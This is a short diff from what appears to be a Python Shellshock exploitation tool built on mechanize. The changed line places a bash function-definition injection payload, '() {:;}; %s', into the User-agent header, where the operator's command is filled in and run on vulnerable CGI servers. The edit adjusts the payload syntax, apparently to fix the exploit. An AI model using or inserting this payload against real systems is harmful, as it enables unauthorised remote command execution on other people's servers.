@@ -185,7 +185,7 @@ def defineMechanize():
         elif exitValue == 1:
             print("{\033[32minfo\033[0m} Bye!")
             exit(1)
-    br.addheaders = [('User-agent', '() { :;} %s'%getCommand)]
+    br.addheaders = [('User-agent', '() {:;}; %s'%getCommand)]
     
 #Main screen 
 def mainChooser():
